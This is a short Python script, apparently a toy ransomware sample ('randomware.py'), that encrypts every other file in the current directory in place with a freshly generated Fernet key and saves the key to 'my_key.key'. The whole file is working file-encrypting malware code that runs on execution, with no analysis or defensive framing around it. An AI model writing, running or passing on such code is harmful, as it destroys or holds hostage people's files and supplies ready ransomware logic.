from cryptography.fernet import Fernet
import os


my_list = []

def encrypt():
	global my_list
	
	for file in os.listdir():
		if file =="randomware.py" or file =="my_key.key" or file =="decrypt.py":
			continue
			
		if os.path.isfile(file):
			my_list.append(file)
			
	
	key = Fernet.generate_key()
	
	with open("my_key.key","wb") as mykey:
		mykey.write(key)
		
	for file in my_list:
		with open(file,"rb") as readfile:
			content = readfile.read()
			contet_encrypt = Fernet(key).encrypt(content)
			with open(file,"wb") as writefile:
				writefile.write(contet_encrypt)
		

encrypt()
		
